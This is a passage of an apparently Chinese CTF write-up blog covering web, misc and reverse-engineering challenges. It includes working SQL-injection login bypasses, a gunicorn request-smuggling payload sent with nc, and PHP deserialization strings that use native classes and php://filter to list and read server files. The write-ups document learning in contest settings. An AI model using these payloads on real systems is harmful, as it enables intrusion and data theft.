class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>关键代码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM users WHERE username='$&#123;username&#125;' AND passwd= '$&#123;passwd&#125;'"</span><span class="token punctuation">;</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$conn</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token operator">-></span><span class="token property">num_rows</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$result</span><span class="token operator">-></span><span class="token function">fetch_assoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'admin'</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'passwd'</span><span class="token punctuation">]</span> <span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'passwd'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token variable">$passwd</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"username or passwd wrong, are you admin?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"wrong user"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"user not exist or wrong passwd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h3><p>post传参内容中：</p><ol><li><p>username参数值为admin</p></li><li><p>passwd参数值为所查询字段的值</p></li></ol><h3 id="payload2"><a href="#payload2" class="headerlink" title="payload2"></a>payload2</h3><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span>:username<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">values</span> <span class="token keyword">row</span><span class="token punctuation">(</span><span class="token string">'admin'</span><span class="token punctuation">,</span><span class="token string">'admin'</span><span class="token punctuation">,</span><span class="token string">'admin'</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>passwd<span class="token operator">=</span>admin<span class="token number">2</span>：username<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token string">' union values row('</span>admin<span class="token string">','</span>admin<span class="token string">','</span>admin'<span class="token punctuation">)</span><span class="token comment">#&amp;passwd=admin</span>第一个<span class="token number">23</span><span class="token operator">%</span>我在使用时没有回显，于是将<span class="token number">23</span><span class="token operator">%</span>换为了<span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2><p><a href="https://www.linuxlz.com/aqld/2359.html">gunicorn 20.0.4 请求走私漏洞简析（含复现环境&amp;Poc）-Linux实验室 (linuxlz.com)</a></p><h3 id="payload："><a href="#payload：" class="headerlink" title="payload："></a>payload：</h3><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">echo <span class="token operator">-</span>en <span class="token string">"GET / HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Length: 123\r\nSec-Websocket-Key1: x\r\n\r\nxxxxxxxxGET /fl4g HTTP/1.1\r\nHost: 127.0.0.1/fl4g\r\nX-Forwarded-For: 127.0.0.1\r\nsecr3t_ip: 127.0.0.1\r\nContent-Length: 35\r\n\r\nGET / HTTP/1.1\r\nHost: localhost\r\n\r\n"</span> <span class="token operator">|</span> nc <span class="token number">59.110</span><span class="token number">.159</span><span class="token number">.206</span> <span class="token number">7020</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="findme"><a href="#findme" class="headerlink" title="findme"></a>findme</h2><p>前言<br>在学习的过程中，战队里的师傅给我发了一道之前没遇见过的反序列化题，引出了原生类这个方面。这一知识点在后面刷题时也会遇到，提前学习一下。借这道题，对原生类的知识点进行一下学习与记录。</p><p>例题：</p> <pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">a</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$un0</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$un1</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$un2</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$un3</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$un4</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">un0</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">un2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span> <span class="token operator">-></span> <span class="token function">Givemeanew</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span> <span class="token operator">-></span> <span class="token property">un3</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'unserialize'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token variable">$this</span> <span class="token operator">-></span> <span class="token function">yigei</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">else</span><span class="token punctuation">&#123;</span>                <span class="token variable">$this</span> <span class="token operator">-></span> <span class="token function">giao</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>         <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">Givemeanew</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span> <span class="token operator">-></span> <span class="token property">un4</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">un0</span><span class="token punctuation">(</span><span class="token variable">$this</span> <span class="token operator">-></span> <span class="token property">un1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//此处可调用原生类</span>    <span class="token punctuation">&#125;</span>          <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">yigei</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Your output: '</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">un4</span><span class="token punctuation">;</span>    <span class="token comment">//输出回显</span>    <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">giao</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">un2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//迷惑选项，实际上本题并不是rce</span>    <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">include</span> <span class="token variable">$this</span> <span class="token operator">-></span> <span class="token property">un2</span><span class="token operator">.</span><span class="token string single-quoted-string">'hint.php'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p> 思路是，</p><p> unserialize()函数执行时，会执行_destruct()函数，想利用原生类读取文件，需要执行 yigei()函数 ， 因此我们要满足 !empty($this-&gt;un0) &amp;&amp; empty($this-&gt;un2) 和 $this -&gt; un3 === ‘unserialize’ 。 这个条件我们可以通过构造序列化来满足。</p><p> 然后想着如何构造payload才能得到flag。</p> <pre class="line-numbers language-none"><code class="language-none">思路： 1： 首先应该先用可遍历目录类，找一下文件的路径 hint.php及flag的路径， 2： 路径确认之后，再用可读取文件类，来读取我们刚确认路径的文件。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></blockquote><p>&lt;1&gt;利用GlobIterator类测文件路径。</p><pre><code>    data=O:1:&quot;a&quot;:5:&#123;s:3:&quot;un0&quot;;s:12:&quot;GlobIterator&quot;;s:3:&quot;un1&quot;;s:8:&quot;hint.php&quot;;s:3:&quot;un2&quot;;N;s:3:&quot;un3&quot;;s:11:&quot;unserialize&quot;;s:3:&quot;un4&quot;;N;&#125;</code></pre><p>得到信息：hint.php就在当前目录下。  这里我试着../flag  ../flag.php等等找flag，根本找不到，一头雾水，本来还以为是我的原生类利用错了。。师傅提醒我读取一下hint.php试试，因此就去找一下hint.php。</p><p>&lt;2&gt; 确定文件目录后，用SplFileObject类进行文件读取。</p><pre><code>    data=O:1:&quot;a&quot;:5:&#123;s:3:&quot;un0&quot;;s:13:&quot;SplFileObject&quot;;s:3:&quot;un1&quot;;s:8:&quot;hint.php&quot;;s:3:&quot;un2&quot;;N;s:3:&quot;un3&quot;;s:11:&quot;unserialize&quot;;s:3:&quot;un4&quot;;N;&#125;</code></pre><p> 没什么变化，但是在源码中发现了  <!--?php--></p><p> ?php类似于伪协议，因此我们继续用伪协议，读取一下 hint.php. 发现 可！</p><p>data=O:1:”a”:5:{s:3:”un0”;s:13:”SplFileObject”;s:3:”un1”;s:57:”php://filter/read=convert.base64-encode/resource=hint.php”;s:3:”un2”;N;s:3:”un3”;s:11:”unserialize”;s:3:”un4”;N;}</p><p> 得到了flag的提示：</p><?php$a = "flag在当前目录下以字母 f 开头的 txt文件 中，无法爆破出来";到这里也就知道，无法爆破出来《=》之前目录遍历flag文件的时候试了好多都没发现，因为flag所在的文件名肯定是猜不出来的，不常见的。<3> 知道flag的特征之后，回去利用GlobIterator类，由于 GlobIterator 类支持直接通过模式匹配来寻找文件路径，也就是说假设我们知道一个文件名的一部分，我们可以通过该类的模式匹配找到其完整的文件名。        data=O:1:"a":5:{s:3:"un0";s:12:"GlobIterator";s:3:"un1";s:6:"f*.txt";s:3:"un2";N;s:3:"un3";s:11:"unserialize";s:3:"un4";N;} 得到flag文件名为：fSSsybePonk_FIndMe.txt知道了文件名和路径之后，就可以利用可读取文件类SplFileObject来读取flag了。        data=O:1:"a":5:{s:3:"un0";s:13:"SplFileObject";s:3:"un1";s:22:"fSSsybePonk_FIndMe.txt";s:3:"un2";N;s:3:"un3";s:11:"unserialize";s:3:"un4";N;}得到flag：  上面是一道运用了原生类知识的例题，下面来记一下有关的知识点。借鉴https://blog.csdn.net/qq_51295677/article/details/123859246?spm=1001.2014.3001.5506PHP之序列化与反序列化（原生类应用篇sdarrorr0的博客-CSDN博客_php原生类反序列化两位师傅的介绍，整理了下自己能看懂的笔记：SPL介绍        SPL就是Standard PHP Library的缩写。据手册显示，SPL是用于解决典型问题(standard problems)的一组接口与类的集合。打开手册，正如上面的定义一样，有许多封装好的类。因为是要解决典型问题，免不了有一些处理文件的这里是标准库：PHP: SPL - ManualPHP 原生文件操作类可遍历目录类可遍历目录类分为下面三个：DirectoryIterator 类FilesystemIterator 类GlobIterator 类1. DirectoryIterator 类   DirectoryIterator 类提供了一个用于查看文件系统目录内容的简单接口。该类的构造方法将会创建一个指定目录的迭代器。DirectoryIterator 类会创建一个指定目录的迭代器。当执行到echo函数时，会触发DirectoryIterator类中的 __toString() 方法，输出指定目录里面经过排序之后的第一个文件名：例如：<?php$dir=new DirectoryIterator("/");echo $dir;这个查不出来什么，如果想输出全部的文件名我们还需要对$dir对象进行遍历：<?php$dir=new DirectoryIterator("/");foreach($dir as $tmp){    echo($tmp.'<br>');    //echo($tmp->__toString().'<br>'); //与上句效果一样}代码里两个语句一样,这也印证了之前说的echo触发了Directorylterator 中的__toString()方法 。我们也可以配合glob://协议使用模式匹配来寻找我们想要的文件路径：<?php$dir=new DirectoryIterator("glob:///*php*");echo $dir; 也可以通过目录穿越，确定我们已知的文件的具体路径：<?php$dir=new DirectoryIterator("glob://./././flag.txt");  //目录穿越echo $dir;2. FilesystemIterator 类   FilesystemIterator 类与 DirectoryIterator 类相同，提供了一个用于查看文件系统目录内容的简单接口。该类的构造方法将会创建一个指定目录的迭代器。该类的使用方法与DirectoryIterator 类也是基本相同的：(子类与父类的关系) 例如：`<?php``$dir=new FilesystemIterator("/");``echo $dir;``<?php``$dir=new FilesystemIterator("/");``foreach($dir as $tmp){`    `echo($tmp.'<br>');`    `//echo($f->__toString().'<br>');``}` 小发现：经 php_study 测试发现，如果123.php文件在D://phpstudy_Pro/WWW/ 下。我们可用于确定路径的文件也必须在其中，如D:// 或 D://phpstudy_Pro 或 D://php_study_Pro/WWW .我发现的是这样，如果有误的话希望可以帮忙改正一下🤐3. GlobIterator 类   GlobIterator 类也可以遍历一个文件目录，使用方法与前两个类也基本相似。但与上面略不同的是其行为类似于 glob()函数，可以通过模式匹配来寻找文件路径。使用这个类不需要额外写上glob://还有：        Directorylterator类 与 FilesystemIterator 类当我们使用echo函数输出的时候，会触发这两个类中的 __toString() 方法，输出指定目录里面特定排序之后的第一个文件名。也就是说如果我们不循环遍历的话是不能看到指定目录里的全部文件的。而GlobIterator 类在一定程度上解决了这个问题。由于 GlobIterator 类支持直接通过模式匹配来寻找文件路径，也就是说假设我们知道一个文件名的一部分，我们可以通过该类的模式匹配找到其完整的文件名。例如：例题里我们知道了flag的文件名特征为 以f开头的.txt文件，因此我们可以通过 GlobIterator类来模式匹配：<?php$dir=new GlobIterator("f*txt");echo $dir;可读取文件类SplFileObject 类SplFileObject 类和 SplFileinfo为单个文件的信息提供了一个高级的面向对象的接口，可以用于对文件内容的遍历、查找、操作等<?php$dir=new SplFileObject("/flag.txt");echo $dir;?><p> 但是这样也只能读取一行，要想全部读取的话还需要对文件中的每一行内容进行遍历：</p><?php    $dir = new SplFileObject("/flag.txt");    foreach($dir as $tmp){        echo ($tmp.'<br>');    }?><p>最后，形如：</p><pre><code>echo new $this-&gt;key($this-&gt;value);$this -&gt; a = new $this-&gt;key($this-&gt;value);echo $this-&gt;a;</code></pre><p>没有pop链的思路和可利用反序列化的函数，一般就是需要用原生类了。</p><p>只需要让$this-&gt;key值赋为我们想用原生函数，$this-&gt;value赋为路径，查就行了。但是这种构造类型的方法的局限性就是只能查一个路径上的第一个文件。<br>————————————————<br>版权声明：本文为CSDN博主「葫芦娃42」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/weixin_63231007/article/details/124740776">https://blog.csdn.net/weixin_63231007/article/details/124740776</a></p><hr><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="misc1"><a href="#misc1" class="headerlink" title="misc1"></a>misc1</h2><blockquote><p>得到一个图片一个加密txt，图片人往下看，猜测图片大小被修改</p></blockquote><h3 id="步骤："><a href="#步骤：" class="headerlink" title="步骤："></a>步骤：</h3><h3 id="1-010看宽高："><a href="#1-010看宽高：" class="headerlink" title="1.010看宽高："></a>1.010看宽高：</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token number">89</span> <span class="token number">50</span> <span class="token number">4</span>E <span class="token number">47</span> <span class="token operator">|</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">03</span> <span class="token class-name">E8</span> <span class="token operator">|</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">01</span> <span class="token number">98</span><span class="token comment">//前两行分别表示jpg格式，图片宽、高</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>报错：</p><p><code>*ERROR: CRC Mismatch @ chunk[0]; in data: 027db6c8; expected: d11ec80c</code></p></blockquote><h3 id="2-修改宽高相等"><a href="#2-修改宽高相等" class="headerlink" title="2.修改宽高相等"></a>2.修改宽高相等</h3><blockquote><p>出现二维码图片</p></blockquote><h3 id="3-二维码转文本——-gt-得到"><a href="#3-二维码转文本——-gt-得到" class="headerlink" title="3.二维码转文本——&gt;得到"></a>3.二维码转文本——&gt;得到</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java">\u5728\u8fd9\u6b21\u51ac\u5965\u4f1a\u7684\u821e\u53f0\u4e0a\uff0c\u6211\u56fd\u5c0f\u5c06\u82cf\u7fca\u9e23\u65a9\u83b7\u4e00\u91d1\u4e00\u94f6\uff0c\u90a3\u4f60\u77e5\u9053\u6b64\u6b21\u51ac\u5965\u4f1a\u6211\u56fd\u603b\u5171\u83b7\u5f97\u51e0\u679a\u5956\u724c\u5417\uff1f\u53c8\u5206\u522b\u662f\u51e0\u91d1\u51e0\u94f6\u51e0\u94dc\u5462\uff1f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>该是一种编码格式</p><p>参考：<a href="https://www.cnblogs.com/ruoli-s/p/14206145.html#uuencode">CTF常见编码及加解密</a></p><p><a href="https://tool.chinaz.com/tools/unicode.aspx">(unicode转中文)</a></p><p>得到：<code>在这次冬奥会的舞台上，我国小将苏翊鸣斩获一金一银，那你知道此次冬奥会我国总共获得几枚奖牌吗？又分别是几金几银几铜呢？</code></p></blockquote><blockquote><p>金银铜按顺序连接该是文本密码了<code>15942</code></p></blockquote><p>参考：<a href="https://mp.weixin.qq.com/s?__biz=MzU4OTg4Nzc4MQ==&chksm=fdc7e6e3cab06ff568708281a3803763201d1e019e70fc26b1b6a270fc061daa9427971ce56d&idx=1&mid=2247485097&scene=21&sn=dced33cdc61c10d58579567480eb39ee">BugKu CTF(杂项篇MISC)—隐写 (qq.com)</a></p><h2 id="misc2、降维打击"><a href="#misc2、降维打击" class="headerlink" title="misc2、降维打击"></a>misc2、降维打击</h2><p>附件是一张图片，属性没问题(主要是看图片大小)</p><h3 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h3><blockquote><ol><li><p>拖到010</p></li><li><p>png格式，分为两段（貌似两个png合成一个了），将后一段截取出来另存</p></li><li><p>得到一张打码图片</p></li><li><p>在kali中，使用zsteg/foremost/binwolk相关语句，查看有无文件包含</p></li><li><p>[zstge安装参考](<a href="https://www.cnblogs.com/vuclw/p/15887745.html">Kali Linux下安装zsteg - B0mbax - 博客园 (cnblogs.com)</a>)</p></li></ol></blockquote><h3 id="补充："><a href="#补充：" class="headerlink" title="补充："></a>补充：</h3><blockquote><p>基于LSB原理的图片隐写，最常用工具就是<strong>Stegsolve</strong>，但是过程还是有些缓慢和复杂。而zsteg，一个用于检测PNG和BMP中的隐藏数据隐藏数据的工具，可以快速提取隐藏信息。</p><p>命令：</p><p><code>zsteg -E &quot;b1,bgr,lsb,xy&quot; 2.png &gt;3.png</code> </p><p><code>foremost 2.png</code></p><p>binwalk 2.png</p></blockquote><p>参考<a href="https://blog.csdn.net/mengmeng0510/article/details/120812017"> kali中binwalk/foremost/zip2john工具的配合使用_</a></p><h2 id="misc3、藏在星空里的诗"><a href="#misc3、藏在星空里的诗" class="headerlink" title="misc3、藏在星空里的诗"></a>misc3、藏在星空里的诗</h2><p>星空图不透明度100%</p><p>flag.txt里边按星星连线得密码（确实winrar）</p><p>密码一一对照</p><h2 id="misc4、真相只有一个"><a href="#misc4、真相只有一个" class="headerlink" title="misc4、真相只有一个"></a>misc4、真相只有一个</h2><blockquote><p>三个文件：</p><ol><li><p>entity.png</p></li><li><p>flag.txt</p></li><li><p>stream</p></li></ol></blockquote><p>wireshark中分析 </p><h2 id="-1"><a href="#-1" class="headerlink" title=""></a></h2><h1 id="re"><a href="#re" class="headerlink" title="re"></a>re</h1><h2 id="re1"><a href="#re1" class="headerlink" title="re1"></a>re1</h2><p>程序经过脱壳显示为32位，放到IDA中，有一个对flag的加密过程，</p><p>过程分为两部分加密，将这两个过程反向还原，即得flag</p><h2 id="re3"><a href="#re3" class="headerlink" title="re3"></a>re3</h2><p>经过一系列隐秘操作，得到一串十进制码</p><blockquote><p>v21 = 1397828937<br>v23 = 1313036669<br>v20 = 1497714515<br>v22 = 1481460802</p><p>v19 = 1127044936<br>v16 = 1230193475<br>v18 = 1113150537<br>v17 = 2068924245</p></blockquote><p>将这些十进制码按顺序，依次各个进行10—-&gt;16—–&gt;字符串转码，拼接起来即得flag</p><blockquote><p>1230193475<br>2068924245<br>1113150537<br>1127044936<br>1497714515<br>1397828937<br>1481460802<br>1313036669</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="CTF_WEB" scheme="https://kannikanyun.github.io/tags/CTF-WEB/"/>
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://kannikanyun.github.io/2022/05/12/BUU-Web-page1/"/>
    <id>https://kannikanyun.github.io/2022/05/12/BUU-Web-page1/</id>
    <published>2022-05-12T14:07:34.000Z</published>
    <updated>2022-06-11T10:03:31.616Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="1、-极客大挑2019-EasySQL1"><a href="#1、-极客大挑2019-EasySQL1" class="headerlink" title="1、[极客大挑2019]EasySQL1"></a>1、[极客大挑2019]EasySQL1</h1><p>看到SQL就想到先尝试万能密码</p><blockquote><p>1’ or 1=1#</p><p>解释：’是为了形成闭合语句，#为注释符(后面语句不再执行)</p><p>需要注意的是:</p><p>1.#可能会被URL自动进行编码导致语句错误</p><p>2.空格被过滤可以使用<code>/**/</code>绕过</p><p><em><u>解决：%23为#注释符的url编码</u></em></p><p>语句相当于：</p></blockquote><pre class="line-numbers language-none"><code class="language-none">select * from table_name where username&#x3D;&#39;1&#39; or 1&#x3D;1 # &#39; and password&#x3D;&#39;xxxxxx&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2-其实应该先简单判断是否存在注入点的"><a href="#2-其实应该先简单判断是否存在注入点的" class="headerlink" title="2.其实应该先简单判断是否存在注入点的"></a>2.其实应该先简单判断是否存在注入点的</h2><p>　如果页面返回错误，则存在 Sql 注入。 原因是无论字符型还是整型都会因为</p><blockquote><p><strong>单引号个数不匹配</strong></p></blockquote><p>而报错。</p><h2 id="3第三步、利用order-by查表的列数"><a href="#3第三步、利用order-by查表的列数" class="headerlink" title="3第三步、利用order by查表的列数"></a>3<em><strong>第三步、利用order by查表的列数</strong></em></h2><p><code>payload：username=1&#39; order by 3%23&amp;password=123（NO,Wrong username password！！！）</code><br><code>payload：username=1&#39; order by 4%23&amp;password=123（Unknown column &#39;4&#39; in &#39;order clause&#39;）</code><br><code>说明表只有三列</code></p><h4 id="4-第四步、如有回显，找到回显位（回显，就是显示正在执行的批处理命令及执行的结果等）"><a href="#4-第四步、如有回显，找到回显位（回显，就是显示正在执行的批处理命令及执行的结果等）" class="headerlink" title="4.第四步、如有回显，找到回显位（回显，就是显示正在执行的批处理命令及执行的结果等）"></a>4.<em><strong>第四步、如有回显，找到回显位（回显，就是显示正在执行的批处理命令及执行的结果等）</strong></em></h4><blockquote><p>payload：username=1’ union select 1,2,3%23&amp;password=123</p></blockquote><h2 id="法二：两处判断都绕过"><a href="#法二：两处判断都绕过" class="headerlink" title="法二：两处判断都绕过"></a>法二：两处判断都绕过</h2><p>使用两次<code>&#39;or 1=1#</code></p><p><code>?username=1&#39;or 1=1%23&amp;password=1&#39; or 1=1%23</code></p><p>[(70条消息) CTF-BUUCTF-<a href="https://blog.csdn.net/qq_42404383/article/details/103688509?ops_request_misc=%7B%22request_id%22:%22165054871516780264049295%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&request_id=165054871516780264049295&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-1-103688509.142%5Ev9%5Epc_search_result_cache,157%5Ev4%5Enew_style&utm_term=%5BHCTF+2018%5DWarmUp+1&spm=1018.2226.3001.4187">HCTF 2018]WarmUp_黑仔丶的博客-CSDN博客_buuctf的warmup题</a></p><h1 id="2、-HCTF-2018-WarmUp"><a href="#2、-HCTF-2018-WarmUp" class="headerlink" title="2、[HCTF 2018]WarmUp"></a>2、[HCTF 2018]WarmUp</h1><blockquote><p>F12提示source.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">emmm</span><span class="token punctuation">&#123;</span>  <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function-definition function">checkFile</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$page</span><span class="token punctuation">)</span>   <span class="token comment">//传入了变量page，也就是我们刚刚传进来的file</span>  <span class="token punctuation">&#123;</span>  <span class="token comment">// 这里定义了白名单</span>      <span class="token variable">$whitelist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"source"</span><span class="token operator">=></span><span class="token string double-quoted-string">"source.php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"hint"</span><span class="token operator">=></span><span class="token string double-quoted-string">"hint.php"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token comment">/*为了返回 true 两个条件必须满足      1 page存在       2 page是字符串 ，      这里和外层的判断file 一致基本是再次判断了一遍*/</span>          <span class="token keyword">echo</span> <span class="token string double-quoted-string">"you can't see it"</span><span class="token punctuation">;</span>          <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>      <span class="token 